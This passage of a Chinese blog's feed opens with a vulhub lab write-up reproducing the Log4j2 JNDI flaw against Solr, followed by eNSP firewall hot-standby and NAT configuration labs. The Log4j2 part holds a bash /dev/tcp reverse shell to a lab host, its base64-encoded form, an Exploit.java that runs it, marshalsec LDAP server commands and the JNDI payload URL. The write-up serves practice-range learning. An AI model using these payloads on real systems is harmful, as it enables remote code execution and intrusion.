class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.100.131/8888 0&gt;&amp;1</span><br><span class="line">base64编码后：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx</span><br><span class="line"></span><br><span class="line">bash：启动Bash shell。</span><br><span class="line">-i：使Bash以交互式模式运行，这通常意味着它会读取用户输入。</span><br><span class="line">&gt;&amp; /dev/tcp/192.168.100.131/8888：这是一个Bash重定向技巧。它将Bash的标准输出（文件描述符1）和标准错误（文件描述符2，由于在此处未明确指定，所以它会跟随标准输出）都重定向到/dev/tcp/192.168.100.131/8888。</span><br><span class="line">/dev/tcp/host/port是某些Unix系统（如Linux）上提供的一种特殊文件，它允许你通过该文件描述符与远程TCP主机和端口进行通信。</span><br><span class="line">在这个例子中，Bash shell尝试连接到IP地址192.168.100.131的8888端口，并将所有输出发送到那里。</span><br><span class="line">0&gt;&amp;1：这是另一个重定向。它将Bash的标准输入（文件描述符0）重定向到之前设置的标准输出（文件描述符1）。由于我们已经将标准输出重定向到/dev/tcp/192.168.100.131/8888，所以这也意味着Bash的标准输入现在来自该TCP连接。</span><br><span class="line"></span><br><span class="line">文件描述符：</span><br><span class="line">0 通常代表标准输入（stdin）</span><br><span class="line">1 通常代表标准输出（stdout）</span><br><span class="line">2 通常代表标准错误（stderr）</span><br><span class="line">&gt;&amp;：</span><br><span class="line">这是一个重定向操作符，它将一个文件描述符重定向到另一个文件描述符。具体来说，它将左边的文件描述符指向右边文件描述符所指向的位置。</span><br><span class="line">0&gt;&amp;1：</span><br><span class="line">这意味着将标准输入（stdin，文件描述符 0）重定向到标准输出（stdout，文件描述符 1）当前所指向的位置。</span><br><span class="line"></span><br><span class="line">所以，整个命令的效果是：启动一个交互式Bash shell，将其标准输入、输出和错误都重定向到与192.168.100.131的8888端口的TCP连接。这允许攻击者（或测试人员）在远程系统上执行命令，并通过TCP连接查看输出。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">bash -c：这告诉bash执行一个由-c选项后面跟随的字符串指定的命令。</span><br><span class="line">|&#123;base64,-d&#125;|：这部分试图使用管道（|）将前面的输出传递给base64 -d命令进行解码。但</span><br><span class="line">&#123;bash,-i&#125;：再次运行bash，但带有-i选项（交互式），</span><br></pre></td></tr></table></figure><p>编写恶意文件，命名为Exploit.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line">public class Exploit &#123;</span><br><span class="line">     public Exploit()&#123;</span><br><span class="line">             try&#123;</span><br><span class="line">                 Runtime.getRuntime().exec(&quot;/bin/bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">                                &#125;catch(Exception e)&#123;</span><br><span class="line">                                            e.printStackTrace();</span><br><span class="line">                                             &#125;</span><br><span class="line">                &#125;</span><br><span class="line">         public static void main(String[] argv)&#123;</span><br><span class="line">                         Exploit e = new Exploit();</span><br><span class="line">                            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将 Exploit.java 文件进行编译，编译为.class文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java </span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173036485.png" alt="image-20240526173036485"></p><p>然后python在该目录下开启一个简单的http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5555</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173304140.png" alt="image-20240526173304140"></p><p>然后需要利用工具marshalsec-0.0.3-SNAPSHOT-all.jar来开启LDAP服务，监听1389端口，并制定加载远程类TouchFile.class，在fastjson文章中也有提到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  &quot;http://刚才http服务的地址:端口号/#Exploit&quot; 1389</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.100.131:5555/#Exploit&quot; 1389</span><br></pre></td></tr></table></figure><p><a href="https://github.com/mbechler/marshalsec">marshalsec项目下载地址</a></p><p>项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174144308.png" alt="image-20240526174144308"></p><p>最后就是构造payload并请求，获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/Exploit&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174651781.png" alt="image-20240526174651781"></p><p>其实几种方法本质上都是一样的，没有太大区别，但都尝试一遍过后，对整个漏洞利用的流程会更加的清晰，也更容易理解</p><p>参考文章：</p><p><a href="https://www.freebuf.com/vuls/382838.html">https://www.freebuf.com/vuls/382838.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1921530">https://cloud.tencent.com/developer/article/1921530</a></p><p><a href="https://blog.csdn.net/Bossfrank/article/details/130148819">https://blog.csdn.net/Bossfrank/article/details/130148819</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【vulhub】Log4j2漏洞复现&quot;&gt;&lt;a href=&quot;#【vulhub】Log4j2漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;【vulhub】Log4j2漏洞复现&quot;&gt;&lt;/a&gt;【vulhub】Log4j2漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;l</summary>
      
    
    
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/vulhub/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>防火墙双机热备</title>
    <link href="https://w-sqrt7.github.io/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/"/>
    <id>https://w-sqrt7.github.io/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/</id>
    <published>2024-05-10T14:29:08.140Z</published>
    <updated>2024-05-25T07:43:08.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="防火墙双机热备"><a href="#防火墙双机热备" class="headerlink" title="防火墙双机热备"></a>防火墙双机热备</h1><h2 id="实验拓扑图一："><a href="#实验拓扑图一：" class="headerlink" title="实验拓扑图一："></a>实验拓扑图一：</h2><p><img src="/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/image-20240510213512085.png" alt="image-20240510213512085"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先将pc及涉及到的各个端口ip进行如上图配置</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[USG1]int g1/0/0</span><br><span class="line">[USG1-GigabitEthernet1/0/0]ip address 192.168.1.1 24</span><br><span class="line">[USG1-GigabitEthernet1/0/2]quit</span><br><span class="line">[USG1]int g1/0/2</span><br><span class="line">[USG1-GigabitEthernet1/0/2]ip address 20.1.1.1 24</span><br><span class="line">[USG1-GigabitEthernet1/0/2]quit</span><br><span class="line">[USG1]int g1/0/3</span><br><span class="line">[USG1-GigabitEthernet1/0/3]ip address 10.1.1.1 24</span><br><span class="line">[USG1-GigabitEthernet1/0/3]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[USG2]int g1/0/0</span><br><span class="line">[USG2-GigabitEthernet1/0/0]ip address 192.168.1.2 24</span><br><span class="line">[USG2-GigabitEthernet1/0/0]quit</span><br><span class="line">[USG2]int g1/0/2</span><br><span class="line">[USG2-GigabitEthernet1/0/2]ip address 20.1.1.2 24</span><br><span class="line">[USG2-GigabitEthernet1/0/2]quit</span><br><span class="line">[USG2]int g1/0/3</span><br><span class="line">[USG2-GigabitEthernet1/0/3]ip address 10.1.1.2 24</span><br><span class="line">[USG2-GigabitEthernet1/0/3]quit</span><br></pre></td></tr></table></figure><p>2.然后配置防火墙的安全区域</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[USG1]firewall zone trust </span><br><span class="line">[USG1-zone-trust]add interface g1/0/0</span><br><span class="line">[USG1-zone-trust]quit</span><br><span class="line">[USG1]firewall zone untrust </span><br><span class="line">[USG1-zone-untrust]add interface g1/0/2</span><br><span class="line">[USG1-zone-untrust]quit</span><br><span class="line">[USG1]firewall zone dmz </span><br><span class="line">[USG1-zone-dmz]add interface g1/0/3</span><br><span class="line">[USG1-zone-dmz]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[USG2]firewall zone trust </span><br><span class="line">[USG2-zone-trust]add interface g1/0/0</span><br><span class="line">[USG2-zone-trust]quit</span><br><span class="line">[USG2]firewall zone untrust </span><br><span class="line">[USG2-zone-untrust]add interface g1/0/2</span><br><span class="line">[USG2-zone-untrust]quit</span><br><span class="line">[USG2]firewall zone dmz</span><br><span class="line">[USG2-zone-dmz]add interface g1/0/3</span><br><span class="line">[USG2-zone-dmz]quit</span><br></pre></td></tr></table></figure><hr><p><strong>3.然后开始配置防火墙双机热备</strong></p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#配置虚拟IP，即备份组IP</span><br><span class="line">[USG1]int g1/0/0</span><br><span class="line">[USG1-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 192.168.1.254 24 active </span><br><span class="line">[USG1-GigabitEthernet1/0/0]quit</span><br><span class="line">[USG1]int g1/0/2</span><br><span class="line">[USG1-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active </span><br><span class="line">[USG1-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#绑定心跳口，注意端口和ip不要弄混淆，本设备配置端口和远程设备对应端口的ip</span><br><span class="line">[USG1]hrp interface g1/0/3 remote 10.1.1.2</span><br><span class="line">#开启hrp备份</span><br><span class="line">[USG1]hrp enable</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[USG2]int g1/0/0</span><br><span class="line">[USG2-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 192.168.1.254 24 standby</span><br><span class="line">[USG2-GigabitEthernet1/0/0]quit</span><br><span class="line">[USG2]int g1/0/2</span><br><span class="line">[USG2-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 standby </span><br><span class="line">[USG2-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[USG2]hrp interface g1/0/3 remote 10.1.1.1</span><br><span class="line">[USG2]hrp enable</span><br></pre></td></tr></table></figure><hr><p>4.在FW1上配置安全策略，会同步备份至FW2，写一个安全策略进行验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HRP_M[USG1]security-policy (+B)</span><br><span class="line">HRP_M[USG1-policy-security]rule name 1 (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]source-zone trust  (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]destination-zone untrust  (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]action permit  (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]quit</span><br><span class="line">HRP_M[USG1-policy-security]quit</span><br></pre></td></tr></table></figure><p>最后将FW1关闭，可以发现PC1和PC2依旧可以通过FW2进行通信</p><p><strong>具体命令详解</strong></p><blockquote><p>[USG1-GigabitEthernet1&#x2F;0&#x2F;0]vrrp vrid 1 virtual-ip 192.168.1.254 24 active<br>[USG1-GigabitEthernet1&#x2F;0&#x2F;2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active </p></blockquote><blockquote><p>配置FW1接口GigabitEthernet0&#x2F;0&#x2F;1的VRRP备份组1，并加入到状态为Active的VGMP管理组。</p><p>配置FW1接口GigabitEthernet0&#x2F;0&#x2F;2的VRRP备份组2，并加入到状态为Active的VGMP管理组。</p></blockquote><ul><li>vrrp: 表示我们正在配置 VRRP。</li><li>vrid 1: VRRP 虚拟路由器标识符（VRID）是唯一的，用于标识一个 VRRP 组。在这里，VRID 是 1。</li><li>virtual-ip 192.168.1.254 24: 这部分配置指定了虚拟 IP 地址（VIP）及其子网掩码。在这里，VIP 是 192.168.1.254，子网掩码的长度是 24（等同于 255.255.255.0）。这个 IP 地址不会分配给任何物理接口，而是作为整个 VRRP 组的虚拟地址，当主路由器工作时，它将成为该组的默认网关。</li></ul><p>active（主模式）或 standby（备份模式）</p><ul><li><code>active</code>: 这表示该路由器是 VRRP 组中的主路由器（也称为 master）。在 VRRP 中，路由器可以是主路由器（负责转发数据）或备份路由器（在主路由器故障时接管）。当设置为 <code>active</code> 时，路由器将尝试成为主路由器。然而，在真实配置中，通常会根据优先级来决定谁是主路由器，而不是直接指定为 <code>active</code>。</li></ul><h2 id="实验拓扑图二："><a href="#实验拓扑图二：" class="headerlink" title="实验拓扑图二："></a>实验拓扑图二：</h2><p><img src="/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-11%20100338.png" alt="屏幕截图 2024-05-11 100338"></p><h2 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h2><p><strong>1.首先对FW1和FW2进行配置，对心跳口进行链路聚合</strong></p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[USG1]int Eth-Trunk 18</span><br><span class="line">[USG1-Eth-Trunk18]mode lacp-static</span><br><span class="line">[USG1-Eth-Trunk18]max active-linknumber 2</span><br><span class="line">[USG1-Eth-Trunk18]trunkport g1/0/0</span><br><span class="line">[USG1-Eth-Trunk18]trunkport g1/0/3</span><br><span class="line">[USG1-Eth-Trunk18]trunkport g1/0/4</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[USG2]int Eth-Trunk 18</span><br><span class="line">[USG2-Eth-Trunk18]mode lacp-static</span><br><span class="line">[USG2-Eth-Trunk18]max active-linknumber 2</span><br><span class="line">[USG2-Eth-Trunk18]trunkport g1/0/0</span><br><span class="line">[USG2-Eth-Trunk18]trunkport g1/0/3</span><br><span class="line">[USG2-Eth-Trunk18]trunkport g1/0/4</span><br></pre></td></tr></table></figure><p>2.然后配置相关端口ip</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USG1]int g1/0/1</span><br><span class="line">[USG1-GigabitEthernet1/0/1]ip address 192.168.1.1 24</span><br><span class="line">[USG1-GigabitEthernet1/0/1]quit</span><br><span class="line">[USG1]int g1/0/2</span><br><span class="line">[USG1-GigabitEthernet1/0/2]ip address 20.1.1.1 24</span><br><span class="line">[USG1-GigabitEthernet1/0/2]quit</span><br><span class="line"></span><br><span class="line">[USG1]int Eth-Trunk 18</span><br><span class="line">[USG1-Eth-Trunk18]ip address 10.1.1.1 30</span><br><span class="line">[USG1-Eth-Trunk18]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USG2]int g1/0/1</span><br><span class="line">[USG2-GigabitEthernet1/0/1]ip address 192.168.1.2 24</span><br><span class="line">[USG2-GigabitEthernet1/0/1]quit</span><br><span class="line">[USG2]int g1/0/2</span><br><span class="line">[USG2-GigabitEthernet1/0/2]ip address 20.1.1.2 24</span><br><span class="line">[USG2-GigabitEthernet1/0/2]quit</span><br><span class="line"></span><br><span class="line">[USG2]int Eth-Trunk 18</span><br><span class="line">[USG2-Eth-Trunk18]ip address 10.1.1.2 30</span><br><span class="line">[USG2-Eth-Trunk18]quit</span><br></pre></td></tr></table></figure><p>3.然后配置划分安全区域</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[USG1]firewall zone trust</span><br><span class="line">[USG1-zone-trust]add interface g1/0/1</span><br><span class="line">[USG1-zone-trust]quit</span><br><span class="line">[USG1]firewall zone untrust </span><br><span class="line">[USG1-zone-untrust]add interface g1/0/2</span><br><span class="line">[USG1-zone-untrust]quit</span><br><span class="line">[USG1]firewall zone dmz </span><br><span class="line">[USG1-zone-dmz]add interface Eth-Trunk 18</span><br><span class="line">[USG1-zone-dmz]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[USG2]firewall zone trust </span><br><span class="line">[USG2-zone-trust]add interface g1/0/1</span><br><span class="line">[USG2-zone-trust]quit</span><br><span class="line">[USG2]firewall zone untrust </span><br><span class="line">[USG2-zone-untrust]add interface g1/0/2</span><br><span class="line">[USG2-zone-untrust]quit</span><br><span class="line">[USG2]firewall zone dmz </span><br><span class="line">[USG2-zone-dmz]add interface Eth-Trunk 18</span><br><span class="line">[USG2-zone-dmz]quit</span><br></pre></td></tr></table></figure><p>4.然后开始配置hrp备份</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[USG1]int g1/0/1</span><br><span class="line">[USG1-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 192.168.1.254 24 active </span><br><span class="line">[USG1-GigabitEthernet1/0/1]quit</span><br><span class="line">[USG1]int g1/0/2</span><br><span class="line">[USG1-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active </span><br><span class="line">[USG1-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[USG1]hrp interface Eth-Trunk 18 remote 10.1.1.2</span><br><span class="line">[USG1]hrp enable</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[USG2]int g1/0/1</span><br><span class="line">[USG2-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 192.168.1.254 24 standby</span><br><span class="line">[USG2-GigabitEthernet1/0/1]quit</span><br><span class="line">[USG2]int g1/0/2</span><br><span class="line">[USG2-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 standby </span><br><span class="line">[USG2-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[USG2]hrp interface Eth-Trunk 18 remote 10.1.1.1</span><br><span class="line">[USG2]hrp enable</span><br></pre></td></tr></table></figure><p>5.最后便是写安全策略进行验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HRP_M[USG1]security-policy  (+B)</span><br><span class="line">HRP_M[USG1-policy-security]rule name 1 (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]source-zone trust  (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]destination-zone untrust  (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]action permit  (+B)</span><br><span class="line">HRP_M[USG1-policy-security-rule-1]quit</span><br><span class="line">HRP_M[USG1-policy-security]quit</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;防火墙双机热备&quot;&gt;&lt;a href=&quot;#防火墙双机热备&quot; class=&quot;headerlink&quot; title=&quot;防火墙双机热备&quot;&gt;&lt;/a&gt;防火墙双机热备&lt;/h1&gt;&lt;h2 id=&quot;实验拓扑图一：&quot;&gt;&lt;a href=&quot;#实验拓扑图一：&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>防火墙业务管理（NAT）</title>
    <link href="https://w-sqrt7.github.io/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/"/>
    <id>https://w-sqrt7.github.io/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/</id>
    <published>2024-05-05T11:26:54.181Z</published>
    <updated>2024-05-06T06:15:42.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="防火墙业务管理（NAT）"><a href="#防火墙业务管理（NAT）" class="headerlink" title="防火墙业务管理（NAT）"></a>防火墙业务管理（NAT）</h1><h2 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h2><p><img src="/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/image-20240505181810396.png" alt="image-20240505181810396"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先是将各个pc以及端口配置对应的ip</p><p>2.然后开始配置防火墙，接口ip配置完成后加入对应的安全区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW1]firewall zone trust </span><br><span class="line">[FW1-zone-trust]add interface g1/0/0</span><br><span class="line">[FW1-zone-trust]quit</span><br><span class="line">[FW1]firewall zone untrust</span><br><span class="line">[FW1-zone-untrust]add interface g1/0/1</span><br><span class="line">[FW1-zone-untrust]quit</span><br></pre></td></tr></table></figure><p>然后配置防火墙的转发策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[FW1]security-policy </span><br><span class="line">[FW1-policy-security]rule name 1</span><br><span class="line">[FW1-policy-security-rule-1]source-zone trust</span><br><span class="line">[FW1-policy-security-rule-1]destination-zone untrust</span><br><span class="line">[FW1-policy-security-rule-1]action permit</span><br></pre></td></tr></table></figure><p>然后配置NAT地址池</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[FW1]nat address-group pool1</span><br><span class="line">[FW1-address-group-pool1]section 192.168.18.5 192.168.18.18</span><br></pre></td></tr></table></figure><p>然后配置NAT策略</p><figure class="highlight 